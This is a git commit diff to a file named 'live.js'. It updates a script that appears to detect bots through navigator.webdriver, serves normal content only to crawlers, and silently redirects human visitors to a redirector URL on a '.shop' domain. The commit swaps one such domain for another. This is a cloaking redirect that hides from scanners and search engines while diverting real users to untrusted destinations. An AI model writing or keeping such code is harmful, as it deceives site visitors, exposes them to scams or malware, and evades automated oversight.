31c4e458ebc625877d7a7fdf38d574019988ecac
kinam-tv <tukoplto@gmail.com>
2026-09-08 11:11:14 +0300

    Update live.js

--- live.js
+++ live.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://j3k8.shop/3/rd.php?url=/p/URUh9mHMuz");
+  window.location.replace("https://x6gb.shop/3/rd.php?url=/l/ehtx");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
